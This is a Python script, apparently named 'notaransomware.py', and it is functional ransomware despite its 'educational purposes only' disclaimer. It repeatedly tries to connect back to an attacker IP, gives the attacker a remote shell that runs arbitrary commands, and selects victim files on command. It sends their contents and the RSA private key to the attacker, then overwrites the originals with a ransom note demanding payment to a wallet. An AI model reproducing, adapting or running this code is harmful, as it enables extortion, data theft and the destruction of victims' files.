# NOTICE: This script is intended to be used for educational purposes ONLY!
# NOTICE: I AM NEVER RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS SCRIPT!
# NOTICE: NOR IS ANYONE ELSE BUT THE PERSON WHO EXECUTES THIS SCRIPT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS SCRIPT!
# WARNING: PLEASE USE THIS SCRIPT INSIDE A VIRTUAL MACHINE OR SANDBOX ENVIRONMENT FOR YOUR SAFETY!

# Prevent multiple instances of the same script from running.
from sys import exit as sys_X_exit
from os.path import exists as os_X_path_X_exists
if os_X_path_X_exists(".IS_RUNNING.now"):
	sys_X_exit(0)
else:
	with open(".IS_RUNNING.now", "w") as f:
		f.write("")







from helpers.networking import RSA_Crypto_ZLIB_Net_Controller
from plsp import Logger
#from plsp.formatters.bundled import Time_Segment_Generator
from plsp.formatters.I_Final_Formatter import I_Final_Formatter
#from plsp.__Color_Configuration import Color_Configuration, A_Foreground_Color, A_Background_Color
from plsp.formatters.Logging_Segment_Generator import Logging_Segment
from helpers.rsa import RSA

from refvars import Reference, new, disable_runtime_usage_checks
disable_runtime_usage_checks()

from typing import Generator
from sys import stdout as sys_X_stdout
from os import popen as os_X_popen
from os import getcwd as os_X_getcwd
from os import chdir as os_X_chdir
from os import name as os_X_name
from os import walk as os_X_walk
from os.path import join as os_X_path_X_join
from os.path import isdir as os_X_path_X_isdir
from os.path import isfile as os_X_path_X_isfile
from os.path import isabs as os_X_path_X_isabs
from os.path import abspath as os_X_path_X_abspath
from os import remove as os_X_remove
from socket import socket as socket_X_socket
from socket import timeout as socket_X_timeout
from argparse import ArgumentParser as argparse_X_ArgumentParser
from time import sleep as time_X_sleep

STARTING_DIR = os_X_getcwd()







# Set up the logger...
logger = Logger()

logger.set("global_context", "main")
logger.add_debug_context("main")
logger.add_debug_mode("info")

logger.contexts["main"].add_sink(
	sys_X_stdout,
)

# NOTE: Disabling the below to save memory for payload.
# TODO: A BUG EXISTS. THE BELOW MEANS THAT CHANGING THE DIRECTORY WILL CHANGE THE OUTPUT SINK.
#logger.contexts["main"].add_sink(
#	os_X_path_X_abspath("payload.log.txt")
#)
#
#my_time_sg = Time_Segment_Generator()
#my_first_cc = Color_Configuration(
#	A_Foreground_Color.BASIC_RED,
#	A_Background_Color.BASIC_BRIGHT_BLACK
#)
#my_time_sg.day.color_config = my_first_cc
#my_time_sg.month.color_config = my_first_cc
#my_time_sg.year.color_config = my_first_cc
#my_time_sg.hour.color_config = my_first_cc
#my_time_sg.minute.color_config = my_first_cc
#my_time_sg.second.color_config = my_first_cc
#my_time_sg.microsecond.color_config = my_first_cc
#my_time_sg.separator.color_config = Color_Configuration(
#       A_Foreground_Color.BASIC_BLACK,
#       A_Background_Color.BASIC_BRIGHT_BLACK
#)
#my_time_sg.date_separator.color_config = my_first_cc
#my_time_sg.time_separator.color_config = my_first_cc
#my_time_sg.second_microsecond_separator.color_config = my_first_cc
#
#logger.contexts["main"].add_LSG(my_time_sg)

class my_final_formatter (I_Final_Formatter):
	def impl_handle(self, results: list[Logging_Segment], non_segments_string:"str") -> list[Logging_Segment]:
		return results+[
			Logging_Segment("NON_SEGMENT_1", f" "),#f"\033[107m \033[0m "),
			Logging_Segment("NON_SEGMENT_2", non_segments_string)
		]

logger.contexts["main"].set_final_formatter(my_final_formatter())

logger.show("info")







# Start...
logger().info("Payload started.")







CONTROLLER:"RSA_Crypto_ZLIB_Net_Controller|None" = None
END_OF_COMMAND_SUFFIX = "\033[107m%\033[0m\n"
CANCEL_RECV_FLAG = new[bool](False).get_ref()
EXIT_FLAG = new[bool](False).get_ref()







def _connection_reset_handler(_:"RSA_Crypto_ZLIB_Net_Controller", __:"Exception|None") -> "None":
	global CANCEL_RECV_FLAG
	CANCEL_RECV_FLAG.set(True)
	if CONTROLLER is not None:
		CONTROLLER.shutdown(e=None)
	EXIT_FLAG.set(True)

def run_command_live(command, cancel_flag:"Reference[bool]") -> Generator[str,None,None]:
	process = os_X_popen(command)
	while True:
		if cancel_flag.get() == True:
			break
		line = process.readline()
		if not line:
			break
		yield line
	process.close()







def try_establish_backdoor(attacker_ip:"str", attacker_port:"int") -> "tuple[str|None, list[str]|None]":
	global CONTROLLER
	global CANCEL_RECV_FLAG
	global EXIT_FLAG
	logger().info("ENTER `try_establish_backdoor`.")
	logger().info(f"] ARG `lan_ip` = [{attacker_ip}].")

	cwd = os_X_getcwd()
	files = []

	s = socket_X_socket()
	s.settimeout(5)
	logger().info(f"Attempting to connect to [{attacker_ip}:{attacker_port}].")
	try:
		s.connect((attacker_ip, attacker_port))
	except (ConnectionRefusedError, socket_X_timeout):
		return None, None
	s.settimeout(500)  # Needed for slow PCs.
	logger().info("Connected to the target.")
	assert s.recv(8) == b"OK."

	CONTROLLER = None
	logger().info("Creating new controller.")
	CONTROLLER = RSA_Crypto_ZLIB_Net_Controller(s, (attacker_ip,attacker_port), _connection_reset_handler)
	CONTROLLER.conduct_handshake()
	logger().info("Controller created.")

	logger().info(f"Sending OS name=[{os_X_name}].")
	CONTROLLER.send(os_X_name)

	def find_files(dir=""):
		files_ret = []
		for base_path, dir_names, file_names in os_X_walk(dir):
			for file_name in file_names:
				file_path = os_X_path_X_join(base_path, file_name)
				if file_path == __file__:
					continue
				logger().info(f"Selected file: [{file_path}].")
				files_ret.append(file_path)
			for dir_name in dir_names:
				dir_path = os_X_path_X_join(base_path, dir_name)
				find_files(dir_path)
		logger().info(f"Returning files [num={len(files_ret)}].")
		return files_ret

	while EXIT_FLAG.get() == False:
		logger().info(f"Sending current working [{cwd}].")
		CONTROLLER.send(cwd)
		user = ""
		for out in run_command_live("whoami", EXIT_FLAG):
			user += out
		user = user.strip()
		if os_X_name == "nt":
			user = user.split("\\")[-1]
		logger().info(f"Sending user [{user}].")
		CONTROLLER.send(user)
		logger().info("Waiting for command.")
		command = CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG)
		if command is None:
			return None, None
		logger().info(f"Received command [{command}].")

		if \
				( (os_X_name != "nt" and command == "clear") or (os_X_name == "nt" and command == "cls") )\
				or command == ":help" or command == ":return":
			continue

		if command.startswith("cd"):
			try:
				os_X_chdir(command.lstrip("cd").strip())
			except FileNotFoundError:
				CONTROLLER.send("Directory does not exist.\n")
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				CONTROLLER.send(END_OF_COMMAND_SUFFIX)
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				continue
			cwd = os_X_getcwd()
			CONTROLLER.send(f"Changed directory to: [{cwd}].\n")
			assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			CONTROLLER.send(END_OF_COMMAND_SUFFIX)
			assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			# Make sure the other side has time to process the message.
			# Otherwise, the message order may be incorrect.
			time_X_sleep(0.5)
			logger().info(f"Changed directory to [{cwd}].")
			continue

		if command.startswith(":select-rec"):
			candidate = command.lstrip(":select-rec").strip()
			logger().info(f"Selecting recursively from [{candidate}].")
			if not os_X_path_X_isdir(candidate):
				logger().info(f"Directory {candidate} does not exist or is not a directory.")
				CONTROLLER.send(f"Directory {candidate} does not exist or is not a directory.\n")
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				CONTROLLER.send(END_OF_COMMAND_SUFFIX)
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				continue
			if not os_X_path_X_isabs(candidate):
				candidate = os_X_path_X_abspath(candidate)
			new_files = find_files(candidate)
			out = ""
			for file in new_files:
				files.append(file)
				out += f"Selected file: [{file}].\n"
			CONTROLLER.send(out)
			assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			CONTROLLER.send(END_OF_COMMAND_SUFFIX)
			assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			continue

		if command.startswith(":select"):
			candidate = command.lstrip(":select").strip()
			if not os_X_path_X_isfile(candidate):
				CONTROLLER.send(f"File {candidate} does not exist or is not a file.\n")
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				CONTROLLER.send(END_OF_COMMAND_SUFFIX)
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				continue
			if not os_X_path_X_isabs(candidate):
				candidate = os_X_path_X_abspath(candidate)
			if candidate == __file__:
				CONTROLLER.send("Cannot encrypt the `notaransomware.py` file.\n")
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				CONTROLLER.send(END_OF_COMMAND_SUFFIX)
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				continue
			CONTROLLER.send(f"Selected file: {candidate}\n")
			assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			CONTROLLER.send(END_OF_COMMAND_SUFFIX)
			assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			files.append(candidate)
			logger().info(f"Selected file: [{candidate}].")
			continue

		if command.startswith(":remove-rec"):
			candidate = command.lstrip(":remove-rec").strip()
			if not os_X_path_X_isabs(candidate):
				candidate = os_X_path_X_abspath(candidate)
			if not os_X_path_X_isdir(candidate):
				CONTROLLER.send(f"Directory {candidate} does not exist or is not a directory.\n")
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				CONTROLLER.send(END_OF_COMMAND_SUFFIX)
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				continue
			if not os_X_path_X_isabs(candidate):
				candidate = os_X_path_X_abspath(candidate)
			req_files = find_files(candidate)
			for file in req_files:
				if not file in files:
					if file == __file__:
						CONTROLLER.send("Cannot remove the `notaransomware.py` file.\n")
						assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
						continue
					CONTROLLER.send(f"File {file} not selected.\n")
					assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
					continue
				files.remove(file)
				CONTROLLER.send(f"Removed file: {file}\n")
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			CONTROLLER.send(END_OF_COMMAND_SUFFIX)
			assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			continue

		if command.startswith(":remove"):
			candidate = command.lstrip(":remove").strip()
			if not os_X_path_X_isabs(candidate):
				candidate = os_X_path_X_abspath(candidate)
			if not candidate in files:
				CONTROLLER.send(f"File {candidate} not selected.\n")
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				CONTROLLER.send(END_OF_COMMAND_SUFFIX)
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				continue
			files.remove(candidate)
			CONTROLLER.send(f"Removed file: {candidate}\n")
			assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			CONTROLLER.send(END_OF_COMMAND_SUFFIX)
			assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
			logger().info(f"Removed file: [{candidate}].")
			continue


		if command == ":list":
			logger().info("Listing files.")
			buff = ""
			for i, file in enumerate(files):
				buff += f"- [{i}] `{file}`...\n"
			if buff:
				CONTROLLER.send(buff)
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				CONTROLLER.send(END_OF_COMMAND_SUFFIX)
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				continue
			else:
				CONTROLLER.send("No files selected.\n")
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				CONTROLLER.send(END_OF_COMMAND_SUFFIX)
				assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"
				continue

		if command.strip() == ":attack":
			logger().info("Attack command received.")
			break

		if command.strip() == ":FULLY_EXIT":
			EXIT_FLAG.set(True)
			break

		logger().info(f"Executing command [{command}].")

		for out in run_command_live(command, EXIT_FLAG):
			logger().info(f"Sending output [{out}].")
			CONTROLLER.send(out)
			if CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "STOP":
				logger().info("STOP command received.")
				EXIT_FLAG.set(True)
				break
		CONTROLLER.send(END_OF_COMMAND_SUFFIX)
		assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "OK"

	logger().info("EXIT `try_establish_backdoor`.")
	logger().info(f"] ARG `lan_ip` = [{attacker_ip}].")
	return cwd, files







def _main(ransom_notice:"str", attacker_ip:"str", attacker_port:"int"):
	global CONTROLLER
	logger().info("ENTER `main`.")
	logger().info(f"] ARG `ransom_notice` = [{ransom_notice}].")
	logger().info(f"] ARG `attacker_ip` = [{attacker_ip}].")
	logger().info(f"] ARG `attacker_port` = [{attacker_port}].")

	ret_code, files_to_encrypt = try_establish_backdoor(attacker_ip, attacker_port)
	logger().info(f"RET CODE = [{ret_code}].")
	logger().info(f"FILES TO ENCRYPT = [{files_to_encrypt}].")

	if not ret_code or not files_to_encrypt:
		logger().info("No files to encrypt.")
		return

	assert isinstance(CONTROLLER, RSA_Crypto_ZLIB_Net_Controller)

	logger().info("Making RSA instance...")
	rsa = RSA()
	# We are already in an encrypted connection, so send both the public and private keys.
	pub1, pub2 = rsa.public_key
	CONTROLLER.send(f"{pub1},{pub2}")
	priv1, priv2 = rsa.private_key
	CONTROLLER.send(f"{priv1},{priv2}")
	logger().info(f"RSA instance created. public=[{pub1},{pub2}] private=[{priv1},{priv2}].")

	logger().info("Encrypting files...")
	CONTROLLER.send("BEGIN_FILE_LIST")
	for file_name in files_to_encrypt:
		CONTROLLER.send(file_name)
	CONTROLLER.send("END_FILE_LIST")
	CONTROLLER.send("BEGIN_FILE_CONTENTS")
	for file_name in files_to_encrypt:
		with open(file_name, "rb") as f:
			lines = f.readlines()
		encrypted_lines = []
		from base64 import b64encode
		for chunk in lines:
			encrypted_lines.append([x for x in rsa.encrypt(b64encode(chunk).decode())])
		for encrypted_chunk in encrypted_lines:
			CONTROLLER.send(",".join(str(x) for x in encrypted_chunk))
		CONTROLLER.send("END\x01FILE")
	CONTROLLER.send("END_FILE_CONTENTS")

	for file_name in files_to_encrypt:
		with open(file_name, "wb") as f:
			f.write("--BEGIN_NOTICE--\n".encode('utf-8'))
			f.write(ransom_notice.encode('utf-8'))
			f.write("\n--END_NOTICE--".encode('utf-8'))

	logger().info("Files encrypted. Attack complete.")

	# Wait for the server to finish.
	# We need to do this since once we exit this method, the connection will be closed and this throws off the server.
	assert CONTROLLER.recv(cancel_flag_p=CANCEL_RECV_FLAG) == "DONE"

	logger().info("EXIT `main`.")
	logger().info(f"] ARG `ransom_notice` = [{ransom_notice}].")
	logger().info(f"] ARG `attacker_ip` = [{attacker_ip}].")
	logger().info(f"] ARG `attacker_port` = [{attacker_port}].")



def is_valid_ip(ip:"str"):
	segments = ip.split(".")
	if not len(segments) == 4:
		return False
	for segment in segments:
		if not segment.isdigit():
			return False
		if not 0 <= int(segment) <= 255:
			return False
	return True



def main():
	global CONTROLLER
	global CANCEL_RECV_FLAG
	global EXIT_FLAG

	epilog = ""
	epilog += "APPENDIX A: [[[This script is persistent. It will continue to attempt to open a backdoor until the"
	epilog += " `:FULLY_EXIT` command has been received from the controller.]]]"

	parser = argparse_X_ArgumentParser(epilog=epilog)

	parser.add_argument("attacker_ip",
		type=str,
		help="The IP address of the direct target."
	)
	parser.add_argument("port",
		type=int,
		help="The port to connect to."
	)
	parser.add_argument("contact_email",
		type=str,
		help="A message advertising an email you would like to provide to your customer."
	)
	parser.add_argument("wallet",
		type=str,
		help="A message advertising a wallet that your customer will send payment."
	)

	args = parser.parse_args()

	if not is_valid_ip(args.attacker_ip):
		parser.print_help()
		sys_X_exit(1)

	ransom_notice = f"""
	Dear valued customer.
	You have been hacked.

	We are holding this file for ransom.

	You may contact us at {args.contact_email} to negotiate the ransom.
	You may send payment to the following wallet: {args.wallet}

	Thank you so much for doing business with us and we hope you have a great day!
	"""
	ransom_notice = ransom_notice

	while EXIT_FLAG.get() == False:
		try:
			CANCEL_RECV_FLAG.set(False)
			_main(ransom_notice, args.attacker_ip, args.port)
			CANCEL_RECV_FLAG.set(True)
		finally:
			if CONTROLLER is not None:
				CONTROLLER = None
		time_X_sleep(5)



if __name__ == "__main__":
	try:
		main()
	except Exception as e:
		if CONTROLLER is not None:
			CANCEL_RECV_FLAG.set(True)
			if CONTROLLER is not None:
				CONTROLLER.shutdown(e=None)
			EXIT_FLAG.set(True)
			CONTROLLER.shutdown(e)
			raise e
		exit(0)
	finally:
		os_X_chdir(STARTING_DIR)
		os_X_remove(".IS_RUNNING.now")
